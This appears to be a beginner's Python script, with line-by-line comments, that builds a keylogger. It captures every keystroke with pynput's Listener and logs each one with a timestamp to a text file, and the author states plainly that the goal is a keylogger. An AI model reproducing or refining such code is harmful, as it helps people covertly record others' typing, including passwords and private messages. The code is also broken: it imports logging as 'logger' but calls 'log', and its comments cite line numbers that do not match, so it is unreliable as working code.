from pynput.keyboard import Listener
import logging as logger



#Here i just import two different python module one is external and other is standard
#in the first line i just imported pynput module which allowing us capture user inputs. since my intention is to making keylogger that's why i am imported listener method
#in the second i just import logging and give it our choice of name logger


log.basicConfig(
    filename = 'capture.txt',
    level = log.DEBUG,
    format = '%(asctime)s - %(message)s'
)
#Line 11 - 15 i just called method log from logging module.

def pressed_key(key):
    logger.info(str(key)) 
    
#In Line 18 i just create custom function with parameter key which is resonsible for holding keys.

with Listener(on_press = pressed_key) as listen:
    listen.join()
